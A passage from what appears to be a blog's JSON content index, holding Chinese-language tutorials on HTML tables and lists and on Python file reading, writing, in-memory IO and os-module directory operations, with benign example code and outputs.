&lt;li>哈哈，这里是第四条有序列表&lt;/li>\n  &lt;/ol>\n\n  &lt;dl>\n            &lt;dt>我是第一个自定义列表的列表项&lt;/dt>\n                &lt;dd>我是第一个自定义列表的列表项的描述&lt;/dd>          \n  &lt;/dl>\n\n&lt;/body>\n&lt;/html>\n\n\n可参读博文：《HTML表格与列表》 \n\n\n四. HTML 表格一、表格\n\n网页中有类似word里面的功能，当然，也会有类似excel里面的功能，表格就是其中之一。\n表格由 &lt;table&gt; 标签来定义。每个表格均有若干行（由 &lt;tr&gt; 标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。\n\n二、表格的结构\n\n&lt;table>                         &lt;!--定义表格-->\n\n        &lt;tr>                    &lt;!--定义一行-->\n\n                &lt;th>&lt;/th>       &lt;!--定义一个标题单元格-->\n\n                &lt;th>&lt;/th>\n\n                &lt;th>&lt;/th>\n\n                &lt;th>&lt;/&lt;th>\n\n        &lt;/tr>\n\n        &lt;tr>\n\n                &lt;td>&lt;/td>       &lt;!--定义一个单元格-->\n\n                &lt;td>&lt;/td>\n\n                &lt;td>&lt;/td>\n\n                &lt;td>&lt;/td>\n\n        &lt;/tr>\n\n&lt;/table>\n\n\n\n二、表格标签及属性\n\n注：属性是区分大小写的，bgColor如果写成bgcolor是没有效果的\n\n &lt;table&gt;&lt;/table&gt; 表，---->可选属性： ↓↓\n Width：表格宽度，单位可以是百分比，也可以是固定值。取值： ↓↓\n pixels\n %\n\n\n Height：表格高度。取值： ↓↓\n pixels\n %\n\n\n Align：表格水平对齐方式（不赞成使用该属性），取值： ↓↓\n left\n center\n right\n\n\n Border：边框粗细。取值： ↓↓\n pixels\n\n\n Bordercolor：边框颜色。取值：rgb(x,x,x)、#xxxxxx、colorname\n bgColor：表格背景色（不赞成使用该属性）。取值： rgb(x,x,x)、#xxxxxx、colorname\n background：背景图片，取值：URL\n cellpadding：单元格边线到内容间的距离(填充距离)。取值： ↓↓\n pixels\n %\n\n\n cellspacing：单元格与单元格之间的距离(间距)，默认是双线，这个很重要取值： ↓↓\n pixels\n %\n\n\n rules：合并单元格边框线，取值：all。注意：rules兼容性不好，请使用CSS来取代它。\n summary：摘要，使搜索引擎更好的读懂表格内容，更好的帮助特殊用户读取表格内容。取值： ↓↓\n text\n\n\n\n\n &lt;caption&gt;&lt;/caption&gt;：定义表格标题。可选属性： ↓↓\n Align：表格水平对齐方式（不赞成使用该属性），取值： ↓↓\n left\n top\n rightbottom\n bottom\n\n\n\n\n &lt;tr&gt;&lt;/tr&gt;：行标记。可选属性： ↓↓\n bgColor：行的背景色。取值： rgb(x,x,x)、#xxxxxx、colorname\n Height：行高度。取值： ↓↓\n pixels\n %\n\n\n Align：表格内容对齐方式。取值： ↓↓\n left\n center\n right\n justify\n char\n\n\n valign：属性趋向于垂直对齐，其值包含：top、bottom、middle、baseline\n\n\n &lt;th&gt;&lt;/th&gt;：标题单元格（每列第一行），居中加粗显示。\n &lt;td&gt;&lt;/td&gt;：普通单元格。&lt;th&gt;和&lt;td&gt;可选属性： ↓↓\n height：单元格高度\n width：单元格宽度\n bgColor：单元格背景色\n background：单元格背景图片\n align：水平对齐\n valign：垂直水齐\n rowspan：上下单元格合并。合并属性必须放在第一个单元格中。\n colspan：左右单元格合并。合并时，有增就得有减，要保证每一行单元格的个数不变。\n\n\n\n\n\n三、表格标签示例\n\n\n&lt;table&gt;、&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;示例：\n\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    &lt;/head>\n    &lt;body>\n     &lt;table border=\"2\" width=\"300\" height=\"100\" bordercolor=\"blue\" bgColor=\"#88cc66\" \n            cellspacing=\"0\" cellpadding=\"2\" rules=\"all\">\n         &lt;tr>\n             &lt;th>工号&lt;/td>\n             &lt;th>姓名&lt;/td>\n             &lt;th>职位&lt;/td>\n         &lt;/tr>\n         &lt;tr>\n             &lt;td>001&lt;/td>\n             &lt;td>小明&lt;/td>\n             &lt;td>设计师&lt;/td>\n         &lt;/tr>\n         &lt;tr>\n             &lt;td>002&lt;/td>\n             &lt;td>小方&lt;/td>\n             &lt;td>工程师&lt;/td>\n         &lt;/tr>\n         &lt;tr>\n             &lt;td>003&lt;/td>\n             &lt;td>小白&lt;/td>\n             &lt;td>程序员&lt;/td>\n         &lt;/tr>\n     &lt;/table> \n    &lt;/body>\n&lt;/html>\n\n\n\n\n\n&lt;caption&gt;&lt;/caption&gt;表格标题示例：\n\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    &lt;/head>\n    &lt;body>\n     &lt;table border=\"2\" width=\"300\" height=\"100\" bordercolor=\"blue\" bgColor=\"#88cc66\" \n            cellspacing=\"0\" cellpadding=\"2\" rules=\"all\">\n         &lt;caption>2019.3月日历&lt;/caption>   &lt;!--放在&lt;table>&lt;/table>中间-->\n         &lt;tr>\n             &lt;th>工号&lt;/td>\n             &lt;th>姓名&lt;/td>\n             &lt;th>职位&lt;/td>\n         &lt;/tr>\n         &lt;tr>\n             &lt;td>001&lt;/td>\n             &lt;td>小明&lt;/td>\n             &lt;td>设计师&lt;/td>\n         &lt;/tr>\n         &lt;tr>\n             &lt;td>002&lt;/td>\n             &lt;td>小方&lt;/td>\n             &lt;td>工程师&lt;/td>\n         &lt;/tr>\n         &lt;tr>\n             &lt;td>003&lt;/td>\n             &lt;td>小白&lt;/td>\n             &lt;td>程序员&lt;/td>\n         &lt;/tr>\n     &lt;/table> \n    &lt;/body>\n&lt;/html>\n\n\n\n\n\n空表格、跨行或者跨列表格示例：\n\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    &lt;/head>\n    &lt;body>\n    &lt;table>   &lt;!--建立空表，无属性-->\n\n    &lt;tr>\n         &lt;td>zdd&lt;/td>\n         &lt;td>30&lt;/td>\n    &lt;/tr>\n\n    &lt;tr>\n         &lt;td>ddz&lt;/td>\n         &lt;td>27&lt;/td>\n    &lt;/tr>\n\n   &lt;/table>\n\n&lt;br>         &lt;!--合并左右单元格-->\n     &lt;table border=\"2\" width=\"400\" height=\"100\" bordercolor=\"blue\" bgColor=\"#88cc66\" \n            cellspacing=\"0\" cellpadding=\"2\" rules=\"all\">\n    &lt;tr>\n        &lt;th>姓名&lt;/th>\n        &lt;th colspan=\"2\">电话&lt;/th>\n    &lt;/tr>\n\n    &lt;tr>\n        &lt;td>Bill Gates&lt;/td>\n        &lt;td>555 77 854&lt;/td>\n        &lt;td>555 77 855&lt;/td>\n    &lt;/tr>\n\n     &lt;/table> \n\n&lt;br>         &lt;!--合并上下单元格-->\n   &lt;table border=\"2\" width=\"400\" height=\"100\" bordercolor=\"blue\" bgColor=\"#88cc66\" \n          cellspacing=\"0\" cellpadding=\"2\" rules=\"all\">\n\n    &lt;tr>\n        &lt;th>姓名&lt;/th>\n        &lt;td>Bill Gates&lt;/td>\n    &lt;/tr>\n\n    &lt;tr>\n        &lt;th rowspan=\"2\">电话&lt;/th>\n        &lt;td>555 77 854&lt;/td>\n    &lt;/tr>\n\n    &lt;tr>\n        &lt;td>555 77 855&lt;/td>\n    &lt;/tr>\n\n   &lt;/table> \n    &lt;/body>\n&lt;/html>\n\n\n\n\n五. HTML 表单\n表单很简单，在HTML里它就是用来人与服务器的交互，或者说是HTML的输入输出交互的重要功能！\n表单后续有时间再详细叙述吧，或者可以看在本站博文就有开始使用了….《PHP操作MySQL数据库》\n\n\n六. CSS《CSS 基础》\n\n\n\n\n\n本文参考：\n《html/css快速入门》《HTML+CSS基础入门教程》《HTML极速入门(2018版)》《弹指间学会HTML视频教程》\n\n\n","thumbnail":"https://i.loli.net/2019/03/09/5c82a81216092.jpg","plink":"https://Directoree.github.io/post/HTML-basics/"},{"title":"Python-文件系统","date":"2019-03-06T07:08:54.000Z","updated":"2019-03-07T07:41:03.786Z","content":"Python是 文件对象.write()，PHP是fwrite() 😀…\n\n\n文件系统 \n\n推荐参考资料：\n《Python3 输入和输出》《Python学习之路-11 (文件操作)》 \n\n\n\n\n一. 读写文件Python提供了 input() 内置函数从标准输入读入一行文本，并将输入以字符串形式返回，默认的标准输入是键盘。\ninput 可以接收一个Python表达式作为输入，并将运算结果返回。\nstr = input(\"请输入：\");\nprint (\"你输入的内容是: \", str)\n\n这会产生如下的对应着输入的结果：\n请输入：菜鸟教程\n你输入的内容是:  菜鸟教程\n\n\n\n使用到的方法：\n\nopen()： 以某种读写模式打开一个文件，将会返回一个 file 对象；\nf.write(string) ： 将 string 写入到文件中, 然后返回写入的字符数；\nf.read(size)： 将读取一定数目的数据, 然后作为字符串或字节对象返回；\nf.readline() ： 从文件读取整行，包括 “\\n” 字符。如果指定了一个非负数的参数，则返回指定大小的字节数，包括 “\\n” 字符。；\nf.readlines() ： 将返回该文件中包含的所有行；\nf.tell() ： 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数；\nf.seek() ： 如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数；\nf.close() ： 当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常。\n\n\n\n\n1.1 open()Python open() 方法用于打开一个文件，并返回文件对象，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError。\n注意：使用 open() 方法一定要保证关闭文件对象，即调用 close() 方法。\nopen() 函数常用形式是接收两个参数：文件名(file)和模式(mode)。即a = open(file, mode);\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\nopen(file, mode, buffering, encoding=None, &emsp;&emsp;&emsp;errors=None, newline=None, &emsp;&emsp;&emsp;closefd=True, opener=None)\nfile: 必需，文件路径（相对或者绝对路径）。mode: 可选，文件打开模式buffering: 设置缓冲encoding: 一般使用utf8errors: 报错级别newline: 区分换行符closefd: 传入的file参数类型opener:\n文件对象\n\n\n\n\nmode 参数有：\n\n\n\n\n模式\n描述\n\n\n\n\nt\n文本模式 (默认)。\n\n\nx\n写模式，新建一个文件，如果该文件已存在则会报错。\n\n\nb\n二进制模式。\n\n\n+\n打开一个文件进行更新(可读可写)。\n\n\nU\n通用换行模式（不推荐）。\n\n\nr\n以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。\n\n\nrb\n以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。\n\n\nr+\n打开一个文件用于读写。文件指针将会放在文件的开头。\n\n\nrb+\n以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。\n\n\nw\n打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。\n\n\nwb\n以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。\n\n\nw+\n打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。\n\n\nwb+\n以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。\n\n\na\n打开一个文件用于追加(不能读)。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。\n\n\nab\n以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。\n\n\na+\n打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。\n\n\nab+\n以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。\n\n\n\n\n下图很好的总结了这几种模式：\n\n\n\n\n\n模式\n读\n写\n创建\n覆盖\n指针在开始\n指针在结尾\n\n\n\n\nr\n✔\n\n\n\n✔\n\n\n\nr+\n✔\n✔\n\n\n✔\n\n\n\nw\n\n✔\n✔\n✔\n✔\n\n\n\nw+\n✔\n✔\n✔\n✔\n✔\n\n\n\na\n\n✔\n✔\n\n\n✔    \n\n\na+\n✔\n✔\n✔\n\n\n✔\n\n\n\n总结：1. w 和 a 都是写入不能读内容，前者是覆盖，后者是追加内容。2. w+ 和 a+ 都是写入且能读内容，前者是覆盖，后者是追加内容。以下实例将字符串写入到文件 foo.txt 中：\n\n# 打开一个文件\nf = open(\"g:/PythonSt/foo.txt\", \"a+\")\nif(f):\n    f.write( \"Python 是一个非常好的语言。\\n是的，的确非常好!!\\n\" )\nelse:\n    print(\"文件打开失败\")\n\n# 关闭打开的文件\nf.close()\n\n此时打开文件 foo.txt,显示如下：\nPython 是一个非常好的语言。\n是的，的确非常好!!\n\n\n\n第一个参数为要打开的文件名。\n第二个参数描述文件如何使用的字符。 mode 可以是 r 如果文件只读, w 只用于写 (如果存在同名文件则将被删除), 和 a 用于追加文件内容; 所写的任何数据都会被自动增加到末尾. r+ 同时用于读写。 mode 参数是可选的; r 将是默认值。\n\n\n\n\n1.2 f.write()\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\nf.write(string)\n将 string 写入到文件中\n返回写入的字符数\n\n\n\n\n# 打开一个文件\nf = open(\"g:/pythonst/foo.txt\", \"w\")\n\nnum = f.write( \"16845654316532\" )\nprint(num)\n# 关闭打开的文件\nf.close()\n\nOUTPUT： 14\n\n\n\n1.3 f.read()为了读取一个文件的内容，调用 f.read(size), 这将读取一定数目的数据, 然后作为字符串或字节对象返回。\nsize 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回。\n注意：f.read(size)必须在r或者r+模式下来读取内容。\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\nf.read(size)\n文件读取指定的字节数（读取的时候文件内容的一个字符按一个字节来读），如果未给定或为负则读取所有\n字符串或字节对象返回\n\n\n\n\n以下实例假定文件 foo.txt 已存在（上面实例中已创建）：\n'''foo.txt文件内容为16845654316532'''\n# 打开一个文件\nf = open(\"g:/PythonSt/foo.txt\", \"r+\")  \nm = f.read(6)\nprint(m)\nprint(isinstance(m,int))\nprint(type(m) is str)\n# 关闭打开的文件\nf.close()\n\nOUTPUT：\n168456      '''把一个字符当作一个字节读取'''\nFalse       '''isinstance(变量,类型)判断变量的类型'''\nTrue        '''type()...is 也可以判断类型'''\n\n\n\n1.4 f.close()在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。\n当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常。如下：\n# 打开一个文件\nf = open(\"g:/pythonst/foo.txt\", \"w\")\n\nnum = f.write( \"16845654316532\" )\nprint(num)\n# 关闭打开的文件\nf.close()\n\nprint(f.read())\n\nOUTPUT： \n14\nTraceback (most recent call last):\n  File \"3-7.py\", line 8, in &lt;module>\n    print(f.read())\nValueError: I/O operation on closed file.\n\n\n由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try ... finally来实现：\n'''foo.txt内容为16845654316532'''\ntry:\n    f = open(\"g:/PythonSt/foo.txt\", \"r+\")  \n    m = f.read(6)\n    print(m)\nfinally:\n    if f:\n        f.close()\n\nOUTPUT： 168456\n\n\n但是每次都这么写实在太繁琐，所以，Python引入了with语句搭配as来自动帮我们调用close()方法：\n'''foo.txt内容为16845654316532'''\nwith open(\"g:/PythonSt/foo.txt\", \"r+\") as f:\n    print(f.read())\n\nOUTPUT： \n16845654316532\n\n\n\n1.5 f.readline()\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\nfileObject.readline(size)\nsize为从文件中读取的字节数。从文件读取整行，（包括 “\\n” 字符。）\nsize非负数则返回指定大小的字节数，包括”\\n”字符。\n\n\n\n\n实例以下实例演示了 readline() 方法的使用：\n文件 runoob.txt 的内容如下：\nwww.runoob.com&#39;\\n&#39;www.runoob.comwww.runoob.comwww.runoob.comwww.runoob.com\n# 打开文件\nfo = open(\"runoob.txt\", \"r+\")\nprint (\"文件名为: \", fo.name)\n\nline = fo.readline()\nprint (\"读取第一行 %s\" % (line))\n\nline = fo.readline(5)\nprint (\"读取的字符串为: %s\" % (line))\n\n# 关闭文件\nfo.close()\n\nOUTPUT:\n文件名为:  runoob.txt\n读取第一行 www.runoob.com'\\n'\n\n读取的字符串为: www.r\n\n\n\n1.6 f.readlines()概述readlines() 方法用于读取所有行(直到结束符 EOF)并返回列表，该列表可以由 Python 的 for… in … 结构进行处理。 如果碰到结束符 EOF 则返回空字符串。\n如果碰到结束符 EOF 则返回空字符串。关于EOF可参考：[文件结束符EOF] \n\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\nfileObject.readlines( )\n无参数\n返回列表，包含所有的行。\n\n\n\n\n实例以下实例演示了 readline() 方法的使用：\n文件 runoob.txt 的内容如下：\nwww.runoob.com&#39;\\n&#39;www.runoob.comwww.runoob.comwww.runoob.comwww.runoob.com\n请自行区分下面两种输出方式：\n\n（1）# 打开文件\nfo = open(\"runoob.txt\", \"r\")\nprint (\"文件名为: \", fo.name)\n\nprint(fo.readlines())\n\n# 关闭文件\nfo.close()\n\nOUTPUT：\n[\"www.runoob.com'\\\\n'\\n\", 'www.runoob.com\\n', 'www.runoob.com\\n', 'www.runoob.com\\n', 'www.runoob.com']\n------------------------------------------------------------------------------------------\n（2）# 打开文件\nfo = open(\"runoob.txt\", \"r\")\nprint (\"文件名为: \", fo.name)\n\nfor line in fo.readlines():                          #依次读取每行  \n    line = line.strip()                             #去掉每行头尾空白  \n    print (\"读取的数据为: %s\" % (line))\n\n# 关闭文件\nfo.close()\n\nOUTPUT：\n文件名为:  runoob.txt\n读取的数据为: www.runoob.com'\\n'\n读取的数据为: www.runoob.com\n读取的数据为: www.runoob.com\n读取的数据为: www.runoob.com\n读取的数据为: www.runoob.com\n\n\n\n1.7 f.tell()f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\nf.tell()\n无参数\n返回文件指针的当前位置（整数）\n\n\n\n\n实例以下实例演示了 readline() 方法的使用：\n文件 runoob.txt 的内容如下：\nwww.runoob.com&#39;\\n&#39;www.runoob.comwww.runoob.comwww.runoob.comwww.runoob.com\n# 打开文件\nfo = open(\"runoob.txt\", \"r+\")\nprint (\"文件名为: \", fo.name)\n\nline = fo.readline()\nprint (\"读取的数据为: %s\" % (line))\n\n# 获取当前文件位置\npos = fo.tell()\nprint (\"当前位置: %d\" % (pos))\n\n\n# 关闭文件\nfo.close()\n\nOUTPUT：\n文件名为:  runoob.txt\n读取的数据为: www.runoob.com'\\n'\n\n当前位置: 20\n\n\n\n1.8 f.seek()如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数。\nfrom_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾。from_what 值为默认为0，即文件开头。例如：\nseek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符seek(x,1) ： 表示从当前位置往后移动x个字符seek(-x,2)：表示从文件的结尾往前移动x个字符\n\n\n\n语法格式\n参数说明\n返回类型\n\n\n\n\n f.seek(offset[, whence])\noffset： 开始的偏移量，也就是代表需要移动偏移的字节数，如果是负数表示从倒数第几位开始。whence：可选，默认值为 0。给 offset 定义一个参数，表示要从哪个位置开始偏移；0 代表从文件开头开始算起，1 代表从当前位置开始算起，2 代表从文件末尾算起。\n无返回值\n\n\n\n\n实例以下实例演示了 readline() 方法的使用：\n文件 runoob.txt 的内容如下：\nwww.runoob.com&#39;\\n&#39;www.runoob.comwww.runoob.comwww.runoob.comwww.runoob.com\n# 打开文件\nfo = open(\"runoob.txt\", \"r+\")\nprint (\"文件名为: \", fo.name)\n\nline = fo.readline()\nprint (\"读取的数据为: %s\" % (line))\n\n# 重新设置文件读取指针到开头\nfo.seek(0, 0)\nline = fo.readline()\nprint (\"读取的数据为: %s\" % (line))\n\n\n# 关闭文件\nfo.close()\n\nOUTPUT：\n文件名为:  runoob.txt\n读取的数据为: www.runoob.com'\\n'\n\n读取的数据为: www.runoob.com'\\n'\n\n\n\n1.9 file 对象的方法\n\n\n\n序号\n方法及描述\n\n\n\n\n1\nfile.close()关闭文件。关闭后文件不能再进行读写操作。\n\n\n2\nfile.flush() 刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件,而不是被动的等待输出缓冲区写入。\n\n\n3\nfile.fileno() 返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。\n\n\n4\nfile.isatty()如果文件连接到一个终端设备返回 True，否则返回 False。\n\n\n5\nfile.next() 返回文件下一行。\n\n\n6\nfile.read([size]) 从文件读取指定的字节数，如果未给定或为负则读取所有。\n\n\n7\nfile.readline([size]) 读取整行，包括 “\\n” 字符。\n\n\n8\nfile.readlines([sizeint]) 读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。\n\n\n9\nfile.seek(offset[, whence]) 设置文件当前位置\n\n\n10\nfile.tell() 返回文件当前位置。\n\n\n11\nfile.truncate([size]) 从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 Widnows 系统下的换行代表2个字符大小。\n\n\n12\nfile.write(str) 将字符串写入文件，返回的是写入的字符长度。\n\n\n13\nfile.writelines(sequence) 向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。\n\n\n\n\n\n二. 在内存读写可参考：\n[StringIO和BytesIO][Python文件读写、StringIO和BytesIO]\n\n\nIO在计算机中指Input/Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。\n由于CPU和内存的速度远远高于外设的速度，所以，在IO编程中，就存在速度严重不匹配的问题。举个例子来说，比如要把100M的数据写入磁盘，CPU输出100M的数据只需要0.01秒，可是磁盘要接收这100M数据可能需要10秒，怎么办呢？有两种办法：\n第一种是CPU等着，也就是程序暂停执行后续代码，等100M的数据在10秒后写入磁盘，再接着往下执行，这种模式称为同步IO；\n另一种方法是CPU不等待，只是告诉磁盘，“您老慢慢写，不着急，我接着干别的事去了”，于是，后续代码可以立刻接着执行，这种模式称为异步IO。\n很明显，使用异步IO来编写程序性能会远远高于同步IO，但是异步IO的缺点是编程模型复杂。\n操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用，Python也不例外。我们后面会详细讨论Python的IO编程接口。\n注意，本章的IO编程都是同步模式，异步IO由于复杂度太高，后续涉及到服务器端程序开发时我们再讨论。\n\n就单独说一下Python的input()和print()：\ninput()： 在控制台把数据输入到内存中，然后从内存中把数据以字符串形式返回给调用处；\nprint()： 从内存中输出括号里的相对应的信息。\n\n2.1 StringIO很多时候，数据读写不一定是文件，也可以在内存中读写。\nStringIO是IO模块中的类，所以使用的时候要引用模块： from io import StringIO\nStringIO顾名思义就是在内存中读写str。\n\n内存中，开辟的一个文本模式的buffer,可以像文件对象一样操作它；\n\n当使用close()前写入的数据是使用追加模式；\n\n当close方法被调用的时候，这个buffer会被释放；\n\n\n好处：\n  一般来说，磁盘的操作比内存的操作要慢得多；内存足够的情况下，一般的优化思路是少落地，减少磁盘IO的过程，可以大大提高程序的运行效率。\n\n使用到的方法：\n\nStringIO()：创建一个StringIO对象，类似文件的open()方法，创建的这个对象要赋值给一个变量；\nf.write(‘String’)：将字符String写入到内存，返回写入的字节数（一个字符按一个字节算）；\nf.getvalue(size)：从内存中读取size个字节（一个字符按一个字节算），若无参数则读取全部字节；\nf.readable()：判断IO是否可读；\nf.writable()：判断IO是否可写；\nf.seekable()：指针是否可操作。\n\n\n要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：\nfrom io import StringIO\n#内存中构建\nf = StringIO()#像文件对象一样操作  这里一定要赋值给一个变量!\nprint(f.readable(), f.writable(), f.seekable())\nf.write(\"Hello\\nPython\")\nf.seek(0)\nprint(f.readline())\nprint(f.getvalue())#无视指针，输出全部内容\nf.close()\n\nOUTPUT：\nTrue True True\nHello\n\nHello\nPython\n\n\n\n2.2 BytesIOStringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。\nBytesIO是IO模块中的类，所以使用的时候要引用模块：from io import BytesIO\n\n内存中，开辟的一个二进制模式的buffer，可以像文件对象一样操作它；\n\n当使用close()前写入的数据是使用追加模式；\n\n当close方法被调用的时候，这个buffer会被释放；\n\n使用到的方法和StringIO一样，不过一个读的是字符一个读的是字节。\n\n\n\nBytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：\nfrom io import BytesIO\n\nff = BytesIO()\nprint(ff.readable(), ff.writable(), ff.seekable())\nff.write(b'Hello\\nPython')\nff.write('中文'.encode('utf-8'))\nff.seek(0)\nprint(ff.readline())\nprint()\nprint(ff.getvalue())\nff.close()\n\nOUTPUT：\nTrue True True\nb'Hello\\n'\n\nb'Hello\\nPython\\xe4\\xb8\\xad\\xe6\\x96\\x87'\n\n\nfile-like对象\n类文件对象，可以像文件对象一样操作；\nsocket对象，输入输出对象(stdin、stdout)都是类文件对象\nfrom sys import stdout\n\nf = stdout\nprint(type(f))\nf.write(\"90data.net\")\n\nOUTPUT：\n&lt;class '_io.TextIOWrapper'>\n90data.net\n\n\n\n三. 操作目录如果我们要操作文件、目录，可以在命令行下面输入操作系统提供的各种命令来完成。比如dir、cp等命令。\n如果要在Python程序中执行这些目录和文件的操作怎么办？其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的os模块也可以直接调用操作系统提供的接口函数。\n具体方法：[Python3 OS 文件/目录方法]\n\n\n打开Python交互式命令行，我们来看看如何使用os模块的基本功能：\nimport os\n\nprint(os.name)    '''如果是posix，说明系统是Linux、Unix或Mac OS X，\n                   如果是nt，就是Windows系统。'''\n\nos.uname()        '''注意uname()函数在Windows上不提供，也就是说，\n                     os模块的某些函数是跟操作系统相关的。'''\n\nos.environ        '''在操作系统中定义的环境变量，全部保存在os.environ\n                     这个变量中'''\n\nos.environ.get('key')  '''要获取某个环境变量的值，可以调用os.environ.get('key')，\n                        如os.environ.get('PATH')'''\n\nprint(os.path.abspath('.'))   '''查看当前目录的绝对路径:'''\n\n\n操作文件和目录\n操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：\n查看当前目录的绝对路径:\n>>> os.path.abspath('.')\n'/Users/michael'\n在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:\n>>> os.path.join('/Users/michael', 'testdir')\n'/Users/michael/testdir'\n然后创建一个目录:\n>>> os.mkdir('/Users/michael/testdir')\n删掉一个目录:\n>>> os.rmdir('/Users/michael/testdir')\n------------------------------------------------------------------------------------------\n把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同\n操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串：\n\npart-1/part-2\n\n而Windows下会返回这样的字符串：\n\npart-1\\part-2\n------------------------------------------------------------------------------------------\n同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以\n把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：\n\n>>> os.path.split('/Users/michael/testdir/file.txt')\n('/Users/michael/testdir', 'file.txt')\nos.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：\n\n>>> os.path.splitext('/path/to/file.txt')\n('/path/to/file', '.txt')\n------------------------------------------------------------------------------------------\n同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分\n为两部分，后一部分总是最后级别的目录或文件名：\n\n>>> os.path.split('/Users/michael/testdir/file.txt')\n('/Users/michael/testdir', 'file.txt')\nos.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：\n\n>>> os.path.splitext('/path/to/file.txt')\n('/path/to/file', '.txt')\n这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。\n------------------------------------------------------------------------------------------\n文件操作使用下面的函数。假定当前目录下有一个test.txt文件：\n\n 对文件重命名:\n>>> os.rename('test.txt', 'test.py')\n 删掉文件:\n>>> os.remove('test.py')\n------------------------------------------------------------------------------------------\n但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们\n通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。\n\n幸运的是shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是\nos模块的补充。\n------------------------------------------------------------------------------------------\n最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：\n\n>>> [x for x in os.listdir('.') if os.path.isdir(x)]\n['.lein', '.local', '.m2', '.npm', '.ssh', '.Trash', '.vim', 'Applications', 'Desktop', ...]\n要列出所有的.py文件，也只需一行代码：\n\n>>> [x for x in os.listdir('.') if os.path.isfile(x) and os.path.splitext(x)[1]=='.py']\n['apis.py', 'config.py', 'models.py', 'pymonitor.py', 'test_db.py', 'urls.py', 'wsgiapp.py']\n\n\n\n四. 序列化参读资料：\n《廖雪峰的官方网站 